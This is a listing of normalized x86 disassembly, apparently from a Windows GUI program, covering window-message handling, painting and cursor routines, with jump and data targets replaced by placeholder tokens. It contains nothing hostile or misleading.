mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_41723c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406e5c
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_44a180
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_44d0a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4188a0
call sub_44cfe8
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4188a0
call sub_44cfe8
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_44d134
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f7b4
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406e48
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44d0a0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406e5c
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_44a180
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44d1c8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_44973c
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_44a24c
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44d134
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406e48
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_448af8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44d0a0
test eax eax
je r-xdata
mov eax ebx
call sub_45fd40
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44a24c
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_44f7b4
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44f7b4
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_44a180
sub_44d32c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44a3e0
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_44a180
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423d18
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_42499c
call sub_423d18
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_4249d8
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_448b54
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_44d434
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_445e6c
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_44a180
mov [ esi + 0xc ] eax
mov bl 0x1
sub_44d468
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_44d588
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d5c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d58f
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4188a0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_44d5c0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_4188fc
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4188a0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417264
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4188a0
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_423d18
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_417264
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_423d18
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417264
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4478c8
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_44a180
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_44d7f0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4478c8
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_44f7b4
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_44f7b4
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_44a180
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_44a180
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4478c8
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_44d7f0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4188a0
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_44d944
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44d468
jmp r-xdata
mov eax ebx
call sub_44c4e4
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44da96
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_44f7b4
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_44a180
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_44d944
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_44f7b4
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_44daa4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44dac4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_44d434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44db38
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44db58
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44db78
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44db9c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44dbc0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44dbe4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44dc08
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43aed8
mov edi eax
mov eax edi
call sub_43afb8
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_4249d8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f7b4
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43b0b8
jmp r-xdata
sub_44dc90
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_44aab4
test bl bl
je r-xdata
mov eax edi
call sub_44fac4
mov eax edi
call sub_44f6bc
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_44f6bc
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_44dd50
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_44a710
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_44dda0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fac4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44c074
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403564
sub_44dde8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_448af8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44d0a0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4685dc
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a94
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_44df38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44e017
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e01e
lea eax [ ebp - 0x4 ]
call sub_404164
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_44f7b4
mov dl [ ebx + 0x184 ]
call sub_4543f4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a0c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4081e0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46680c
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46680c
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46680c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_44e024
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44e0ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e0b5
lea eax [ ebp - 0x4 ]
call sub_404164
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a0c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4081e0
test eax eax
je r-xdata
mov eax ebx
call sub_44f7b4
mov dl 0x1
call sub_4543d8
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_44e110
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_417254
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_44a180
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_44e160
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_44e194
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403564
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403564
pop edi
pop esi
pop ebx
pop ecx
pop ebp
